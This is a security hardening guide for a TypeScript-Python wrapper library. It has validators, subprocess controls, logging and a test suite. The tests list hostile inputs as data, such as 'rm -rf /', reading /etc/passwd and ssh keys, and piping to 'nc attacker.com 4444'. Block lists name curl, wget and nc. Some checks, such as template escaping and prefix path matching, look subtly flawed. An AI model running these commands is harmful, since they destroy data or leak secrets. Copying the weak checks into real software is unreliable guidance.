# tywrap v0.2.0 Security Guide

## 🔒 Security Overview

tywrap v0.2.0 has undergone comprehensive security hardening to address all critical vulnerabilities identified in the security audit. This guide provides detailed security configuration and best practices for production deployment.

## 🚨 Security Audit Summary

### Addressed Vulnerabilities (v0.2.0)
- ✅ **Command Injection**: Complete subprocess execution hardening
- ✅ **Path Traversal**: Absolute path validation and sandboxing
- ✅ **Code Injection**: Template literal escaping in TypeScript generation
- ✅ **Unsafe Module Imports**: Python module whitelist validation
- ✅ **Environment Variable Injection**: Environment sanitization
- ✅ **JSON Parsing Vulnerabilities**: Schema validation and prototype pollution prevention
- ✅ **Input Validation**: Comprehensive input sanitization framework
- ✅ **Memory Management**: Leak detection and resource limits

### Security Architecture
```
                    User Input
                        │
                   ┌────▼────┐
                   │ Input   │
                   │Validator│ ◄─── Whitelist validation
                   └────┬────┘      Schema validation
                        │           Sanitization
                   ┌────▼────┐
                   │Subprocess│ ◄─── Command whitelist
                   │ Security │      Argument validation
                   └────┬────┘      Environment cleanup
                        │
                   ┌────▼────┐
                   │  Code   │ ◄─── Template escaping
                   │Generator│      Injection prevention
                   └────┬────┘
                        │
                   ┌────▼────┐
                   │Security │ ◄─── Audit logging
                   │Monitor  │      Event tracking
                   └─────────┘      Alert system
```

## 🛡️ Security Configuration

### Core Security Config
```typescript
// security.config.ts
import { SecurityConfig } from 'tywrap';

export const securityConfig: SecurityConfig = {
  // Input validation and sanitization
  inputValidation: {
    enabled: true,
    strictMode: true,
    maxInputSize: 1024 * 1024, // 1MB
    allowedCharacters: /^[a-zA-Z0-9._-]+$/,
    rejectPatterns: [
      /[;&|`$<>]/,           // Shell injection characters
      /\.\./,                // Path traversal
      /__(import|eval)__/,   // Python dangerous functions
      /<script/i,            // Script tags
      /javascript:/i         // JavaScript protocol
    ]
  },
  
  // Module security
  moduleWhitelist: {
    enabled: true,
    allowedModules: [
      // Standard library (safe modules only)
      'math', 'json', 'datetime', 'collections', 'itertools', 'functools',
      'uuid', 'hashlib', 'base64', 'urllib.parse',
      
      // Scientific computing
      'numpy', 'pandas', 'scipy',
      
      // Web frameworks (if needed)
      'fastapi', 'pydantic', 'requests',
      
      // Data processing
      'csv', 'xml.etree.ElementTree'
    ],
    blockedModules: [
      // Dangerous modules
      'os', 'subprocess', 'sys', 'importlib',
      'eval', 'exec', 'compile', '__builtins__',
      'open', 'file', 'input', 'raw_input',
      
      // Network and system
      'socket', 'urllib.request', 'http.client',
      'multiprocessing', 'threading', 'asyncio',
      
      // File system
      'shutil', 'tempfile', 'pathlib',
      'glob', 'fnmatch'
    ]
  },
  
  // Subprocess security
  subprocess: {
    commandWhitelist: ['python3', 'python', 'node'],
    argumentValidation: true,
    environmentCleaning: true,
    timeout: 30000,
    maxBuffer: 10 * 1024 * 1024, // 10MB
    killSignal: 'SIGTERM',
    allowedEnvironmentVars: [
      'PATH', 'PYTHONPATH', 'HOME', 'USER',
      'LC_ALL', 'LANG', 'TZ'
    ]
  },
  
  // File system security  
  filesystem: {
    pathValidation: true,
    allowedDirectories: [
      '/app/generated',
      '/app/.tywrap-cache',
      '/tmp/tywrap'
    ],
    maxFileSize: 50 * 1024 * 1024, // 50MB
    allowedExtensions: ['.py', '.json', '.txt', '.md'],
    preventPathTraversal: true
  },
  
  // Code generation security
  codeGeneration: {
    templateEscaping: true,
    injectionPrevention: true,
    outputValidation: true,
    sourceMapSanitization: true
  },
  
  // Monitoring and logging
  monitoring: {
    auditLogging: true,
    securityEvents: true,
    performanceMonitoring: true,
    errorTracking: true,
    logLevel: 'info',
    logRetention: 30 * 24 * 60 * 60 * 1000 // 30 days
  }
};
```

## 🔐 Input Validation

### SecurityValidator Implementation
```typescript
// security/validator.ts
export class SecurityValidator {
  private static readonly FORBIDDEN_CHARS = /[;&|`$<>]/;
  private static readonly PATH_TRAVERSAL = /\.\./;
  private static readonly PYTHON_DANGEROUS = /__(import|eval|exec)__/;
  
  /**
   * Validate module name against security policies
   */
  static validateModuleName(name: string): string {
    if (!name || typeof name !== 'string') {
      throw new SecurityError('Module name must be a non-empty string');
    }
    
    if (name.length > 100) {
      throw new SecurityError('Module name too long (max 100 characters)');
    }
    
    if (this.FORBIDDEN_CHARS.test(name)) {
      throw new SecurityError('Module name contains forbidden characters');
    }
    
    if (this.PATH_TRAVERSAL.test(name)) {
      throw new SecurityError('Path traversal detected in module name');
    }
    
    // Validate against module whitelist
    const config = getSecurityConfig();
    if (config.moduleWhitelist.enabled) {
      const baseModule = name.split('.')[0];
      if (!config.moduleWhitelist.allowedModules.includes(baseModule)) {
        throw new SecurityError(`Module not allowed: ${baseModule}`);
      }
      
      if (config.moduleWhitelist.blockedModules.includes(baseModule)) {
        throw new SecurityError(`Module explicitly blocked: ${baseModule}`);
      }
    }
    
    return name;
  }
  
  /**
   * Validate file path against traversal attacks
   */
  static validatePath(userPath: string, baseDir: string): string {
    if (!userPath || !baseDir) {
      throw new SecurityError('Path and base directory are required');
    }
    
    const normalizedPath = path.normalize(userPath);
    
    if (this.PATH_TRAVERSAL.test(normalizedPath)) {
      throw new SecurityError('Path traversal detected');
    }
    
    const absolutePath = path.isAbsolute(normalizedPath) 
      ? normalizedPath 
      : path.join(baseDir, normalizedPath);
    
    if (!absolutePath.startsWith(baseDir)) {
      throw new SecurityError('Path outside allowed directory');
    }
    
    // Check against allowed directories
    const config = getSecurityConfig();
    const isAllowed = config.filesystem.allowedDirectories.some(dir =>
      absolutePath.startsWith(dir)
    );
    
    if (!isAllowed) {
      throw new SecurityError('Path not in allowed directories');
    }
    
    return absolutePath;
  }
  
  /**
   * Validate subprocess command and arguments
   */
  static validateCommand(command: string, args: string[]): void {
    const config = getSecurityConfig();
    
    if (!config.subprocess.commandWhitelist.includes(command)) {
      throw new SecurityError(`Command not allowed: ${command}`);
    }
    
    if (config.subprocess.argumentValidation) {
      args.forEach(arg => {
        if (this.FORBIDDEN_CHARS.test(arg)) {
          throw new SecurityError('Forbidden characters in command argument');
        }
        
        if (arg.length > 1000) {
          throw new SecurityError('Command argument too long');
        }
      });
    }
  }
  
  /**
   * Escape string for safe template literal usage
   */
  static escapeForTemplate(str: string): string {
    return str.replace(/[\\`'${}]/g, '\\$&');
  }
  
  /**
   * Sanitize environment variables
   */
  static sanitizeEnvironment(env: NodeJS.ProcessEnv): NodeJS.ProcessEnv {
    const config = getSecurityConfig();
    const sanitized: NodeJS.ProcessEnv = {};
    
    config.subprocess.allowedEnvironmentVars.forEach(varName => {
      if (env[varName]) {
        sanitized[varName] = env[varName];
      }
    });
    
    return sanitized;
  }
}
```

### Custom Security Error Class
```typescript
// security/errors.ts
export class SecurityError extends Error {
  public readonly code: string;
  public readonly severity: 'low' | 'medium' | 'high' | 'critical';
  public readonly timestamp: Date;
  
  constructor(message: string, code?: string, severity: 'low' | 'medium' | 'high' | 'critical' = 'high') {
    super(message);
    this.name = 'SecurityError';
    this.code = code || 'SECURITY_VIOLATION';
    this.severity = severity;
    this.timestamp = new Date();
    
    // Log security event
    SecurityLogger.logSecurityEvent({
      type: 'security_error',
      message,
      code,
      severity,
      timestamp: this.timestamp,
      stackTrace: this.stack
    });
  }
}
```

## 🚀 Secure Subprocess Execution

### SecureSubprocess Implementation
```typescript
// security/subprocess.ts
export class SecureSubprocess {
  private static readonly DEFAULT_TIMEOUT = 30000;
  private static readonly MAX_BUFFER = 10 * 1024 * 1024; // 10MB
  
  async execute(command: string, args: string[] = [], options: SubprocessOptions = {}): Promise<SubprocessResult> {
    // Validate command and arguments
    SecurityValidator.validateCommand(command, args);
    
    // Prepare secure environment
    const sanitizedEnv = SecurityValidator.sanitizeEnvironment(process.env);
    
    // Set resource limits
    const execOptions: SpawnOptions = {
      env: sanitizedEnv,
      timeout: options.timeout || this.DEFAULT_TIMEOUT,
      maxBuffer: this.MAX_BUFFER,
      killSignal: 'SIGTERM',
      stdio: 'pipe',
      shell: false // NEVER use shell=true
    };
    
    // Log subprocess execution
    SecurityLogger.logSecurityEvent({
      type: 'subprocess_execution',
      command,
      args: args.slice(0, 3), // Log first 3 args only
      timestamp: new Date()
    });
    
    try {
      const startTime = Date.now();
      const child = spawn(command, args, execOptions);
      
      // Set up timeout handler
      const timeoutId = setTimeout(() => {
        child.kill('SIGTERM');
        setTimeout(() => child.kill('SIGKILL'), 5000);
      }, execOptions.timeout);
      
      const result = await new Promise<SubprocessResult>((resolve, reject) => {
        let stdout = '';
        let stderr = '';
        
        child.stdout?.on('data', (data) => {
          stdout += data.toString();
          if (stdout.length > this.MAX_BUFFER) {
            child.kill('SIGTERM');
            reject(new SecurityError('Subprocess output exceeds maximum buffer size'));
          }
        });
        
        child.stderr?.on('data', (data) => {
          stderr += data.toString();
        });
        
        child.on('close', (code, signal) => {
          clearTimeout(timeoutId);
          resolve({
            code: code || 0,
            stdout,
            stderr,
            duration: Date.now() - startTime,
            signal
          });
        });
        
        child.on('error', (error) => {
          clearTimeout(timeoutId);
          reject(new SecurityError(`Subprocess execution failed: ${error.message}`));
        });
      });
      
      // Validate result
      this.validateSubprocessResult(result);
      
      return result;
    } catch (error) {
      SecurityLogger.logSecurityEvent({
        type: 'subprocess_error',
        command,
        error: error.message,
        timestamp: new Date(),
        severity: 'high'
      });
      throw error;
    }
  }
  
  private validateSubprocessResult(result: SubprocessResult): void {
    // Check for suspicious output patterns
    const suspiciousPatterns = [
      /eval\(/i,
      /exec\(/i,
      /__import__/i,
      /subprocess/i,
      /os\.system/i
    ];
    
    const output = result.stdout + result.stderr;
    suspiciousPatterns.forEach(pattern => {
      if (pattern.test(output)) {
        throw new SecurityError('Suspicious patterns detected in subprocess output');
      }
    });
    
    // Check output size
    if (output.length > this.MAX_BUFFER) {
      throw new SecurityError('Subprocess output exceeds security limits');
    }
  }
}
```

## 🔍 Security Monitoring

### Security Logger
```typescript
// security/logger.ts
interface SecurityEvent {
  type: string;
  message?: string;
  severity?: 'low' | 'medium' | 'high' | 'critical';
  timestamp: Date;
  metadata?: any;
}

export class SecurityLogger {
  private static events: SecurityEvent[] = [];
  private static readonly MAX_EVENTS = 10000;
  
  static logSecurityEvent(event: SecurityEvent): void {
    // Add to in-memory buffer
    this.events.push(event);
    
    // Maintain buffer size
    if (this.events.length > this.MAX_EVENTS) {
      this.events.shift();
    }
    
    // Log to file/external system based on severity
    if (event.severity === 'critical' || event.severity === 'high') {
      this.sendToSecurityTeam(event);
    }
    
    // Console log in development
    if (process.env.NODE_ENV !== 'production') {
      console.warn('🔒 Security Event:', event);
    }
    
    // Send to monitoring system
    this.sendToMonitoring(event);
  }
  
  private static sendToSecurityTeam(event: SecurityEvent): void {
    // Implement integration with security incident management
    // This could be PagerDuty, Slack, email, etc.
    console.error('🚨 SECURITY ALERT:', event);
  }
  
  private static sendToMonitoring(event: SecurityEvent): void {
    // Send to Prometheus, Datadog, or other monitoring systems
    if (typeof window === 'undefined' && global.monitoring) {
      global.monitoring.incrementCounter('tywrap_security_events_total', {
        type: event.type,
        severity: event.severity || 'medium'
      });
    }
  }
  
  static getSecurityEvents(filters?: {
    severity?: string;
    type?: string;
    since?: Date;
  }): SecurityEvent[] {
    let filtered = [...this.events];
    
    if (filters) {
      if (filters.severity) {
        filtered = filtered.filter(e => e.severity === filters.severity);
      }
      if (filters.type) {
        filtered = filtered.filter(e => e.type === filters.type);
      }
      if (filters.since) {
        filtered = filtered.filter(e => e.timestamp >= filters.since);
      }
    }
    
    return filtered.sort((a, b) => b.timestamp.getTime() - a.timestamp.getTime());
  }
  
  static generateSecurityReport(): SecurityReport {
    const now = new Date();
    const last24h = new Date(now.getTime() - 24 * 60 * 60 * 1000);
    const events = this.getSecurityEvents({ since: last24h });
    
    const eventsByType = events.reduce((acc, event) => {
      acc[event.type] = (acc[event.type] || 0) + 1;
      return acc;
    }, {} as Record<string, number>);
    
    const eventsBySeverity = events.reduce((acc, event) => {
      const severity = event.severity || 'medium';
      acc[severity] = (acc[severity] || 0) + 1;
      return acc;
    }, {} as Record<string, number>);
    
    return {
      period: { start: last24h, end: now },
      totalEvents: events.length,
      eventsByType,
      eventsBySeverity,
      recommendations: this.generateRecommendations(events)
    };
  }
  
  private static generateRecommendations(events: SecurityEvent[]): string[] {
    const recommendations: string[] = [];
    
    const highSeverityCount = events.filter(e => e.severity === 'high' || e.severity === 'critical').length;
    if (highSeverityCount > 5) {
      recommendations.push('High number of critical security events detected. Review security policies.');
    }
    
    const inputValidationErrors = events.filter(e => e.type === 'security_error').length;
    if (inputValidationErrors > 10) {
      recommendations.push('Frequent input validation failures. Consider stricter input filtering.');
    }
    
    const subprocessErrors = events.filter(e => e.type === 'subprocess_error').length;
    if (subprocessErrors > 3) {
      recommendations.push('Subprocess execution failures detected. Review subprocess security configuration.');
    }
    
    return recommendations;
  }
}
```

## 🛡️ Content Security Policy

### CSP Configuration for Browser Usage
```typescript
// security/csp.ts
export const contentSecurityPolicy = {
  directives: {
    defaultSrc: ["'self'"],
    scriptSrc: [
      "'self'",
      "'unsafe-inline'", // Only for development
      "https://cdn.jsdelivr.net" // For Pyodide
    ],
    styleSrc: ["'self'", "'unsafe-inline'"],
    imgSrc: ["'self'", "data:", "https:"],
    fontSrc: ["'self'", "https:", "data:"],
    connectSrc: [
      "'self'",
      "https://pypi.org", // For Python packages
      "wss:" // For WebSocket connections
    ],
    mediaSrc: ["'self'"],
    objectSrc: ["'none'"],
    childSrc: ["'self'"],
    frameSrc: ["'none'"],
    workerSrc: ["'self'", "blob:"], // For Web Workers
    manifestSrc: ["'self'"],
    baseUri: ["'self'"],
    formAction: ["'self'"],
    frameAncestors: ["'none'"],
    upgradeInsecureRequests: []
  }
};
```

## 🔄 Security Testing

### Security Test Suite
```typescript
// test/security.test.ts
describe('Security Tests', () => {
  describe('Input Validation', () => {
    it('should reject command injection attempts', () => {
      const maliciousInputs = [
        'math; rm -rf /',
        'numpy && cat /etc/passwd',
        'pandas | nc attacker.com 4444',
        'scipy `whoami`',
        'requests $(id)'
      ];
      
      maliciousInputs.forEach(input => {
        expect(() => SecurityValidator.validateModuleName(input))
          .toThrow(SecurityError);
      });
    });
    
    it('should reject path traversal attempts', () => {
      const maliciousPaths = [
        '../../../../etc/passwd',
        '../../../home/user/.ssh/id_rsa',
        '..\\..\\..\\windows\\system32\\config\\sam',
        '/etc/shadow',
        '~/.bashrc'
      ];
      
      maliciousPaths.forEach(path => {
        expect(() => SecurityValidator.validatePath(path, '/app/safe'))
          .toThrow(SecurityError);
      });
    });
  });
  
  describe('Subprocess Security', () => {
    it('should only allow whitelisted commands', async () => {
      const subprocess = new SecureSubprocess();
      
      const maliciousCommands = [
        'rm', 'cat', 'curl', 'wget', 'nc', 'bash', 'sh'
      ];
      
      for (const command of maliciousCommands) {
        await expect(subprocess.execute(command))
          .rejects.toThrow(SecurityError);
      }
    });
    
    it('should sanitize environment variables', () => {
      const maliciousEnv = {
        PATH: '/usr/bin',
        MALICIOUS_VAR: 'evil_value',
        LD_PRELOAD: '/path/to/malicious.so',
        PYTHONPATH: '/safe/path'
      };
      
      const sanitized = SecurityValidator.sanitizeEnvironment(maliciousEnv);
      
      expect(sanitized.PATH).toBe('/usr/bin');
      expect(sanitized.PYTHONPATH).toBe('/safe/path');
      expect(sanitized.MALICIOUS_VAR).toBeUndefined();
      expect(sanitized.LD_PRELOAD).toBeUndefined();
    });
  });
  
  describe('Code Generation Security', () => {
    it('should escape template literals', () => {
      const maliciousStrings = [
        'alert("xss")',
        '${evil_code}',
        '`command_injection`',
        "'; DROP TABLE users; --"
      ];
      
      maliciousStrings.forEach(str => {
        const escaped = SecurityValidator.escapeForTemplate(str);
        expect(escaped).not.toContain('${');
        expect(escaped).not.toContain('`');
        expect(escaped).not.toContain("'");
      });
    });
  });
});
```

## 📊 Security Metrics and KPIs

### Security Dashboard Metrics
```typescript
// monitoring/security-metrics.ts
export const securityMetrics = {
  // Input validation metrics
  inputValidationFailures: new Counter({
    name: 'tywrap_input_validation_failures_total',
    help: 'Total input validation failures',
    labelNames: ['type', 'severity']
  }),
  
  // Subprocess security metrics
  subprocessSecurityEvents: new Counter({
    name: 'tywrap_subprocess_security_events_total',
    help: 'Total subprocess security events',
    labelNames: ['event_type', 'command']
  }),
  
  // Code generation security
  codeGenerationSecurityEvents: new Counter({
    name: 'tywrap_code_generation_security_events_total',
    help: 'Code generation security events'
  }),
  
  // Security response times
  securityValidationDuration: new Histogram({
    name: 'tywrap_security_validation_duration_seconds',
    help: 'Time spent on security validation',
    labelNames: ['validation_type']
  })
};

// Security KPIs
export const securityKPIs = {
  // Target: 0 critical security events per day
  criticalSecurityEvents: 0,
  
  // Target: <0.1% input validation failure rate
  inputValidationFailureRate: 0.05,
  
  // Target: 100% subprocess commands validated
  subprocessValidationCoverage: 1.0,
  
  // Target: <50ms security validation overhead
  securityValidationOverhead: 25
};
```

## 🚨 Incident Response Plan

### Security Incident Response
```markdown
# Security Incident Response Plan

## Severity Levels
- **Critical**: Active exploitation, data breach, system compromise
- **High**: Vulnerability confirmed, potential for exploitation
- **Medium**: Security weakness identified, low immediate risk
- **Low**: Security best practice violation

## Response Timeline
- **Critical**: Immediate response (0-15 minutes)
- **High**: 2 hours
- **Medium**: 24 hours  
- **Low**: 1 week

## Response Steps
1. **Immediate Assessment**
   - Identify affected systems
   - Assess scope and impact
   - Determine if incident is ongoing

2. **Containment**
   - Isolate affected systems
   - Block malicious IPs
   - Disable compromised accounts

3. **Investigation**
   - Collect logs and evidence
   - Analyze attack vectors
   - Identify root cause

4. **Recovery**
   - Patch vulnerabilities
   - Update security policies
   - Restore services

5. **Post-Incident**
   - Document lessons learned
   - Update response procedures
   - Implement additional controls
```

## ✅ Security Compliance Checklist

### Production Deployment Checklist
- [ ] All critical vulnerabilities from security audit addressed
- [ ] Input validation enabled and tested
- [ ] Module whitelist configured and enforced
- [ ] Subprocess security hardening implemented
- [ ] Path traversal protection verified
- [ ] Code generation injection protection tested
- [ ] Security logging and monitoring enabled
- [ ] Incident response procedures documented
- [ ] Security testing suite passing
- [ ] Dependency vulnerability scanning automated
- [ ] Content Security Policy configured (browser deployment)
- [ ] Environment variable sanitization verified
- [ ] Resource limits and timeouts configured
- [ ] Security metrics and alerting configured
- [ ] Regular security reviews scheduled

### Ongoing Security Maintenance
- [ ] Monthly dependency updates and vulnerability scans
- [ ] Quarterly security reviews and penetration testing
- [ ] Annual security architecture reviews
- [ ] Continuous monitoring of security events
- [ ] Regular backup and recovery testing
- [ ] Security training for development team

---

**tywrap v0.2.0** - Secure by design. Hardened for production. Ready for enterprise.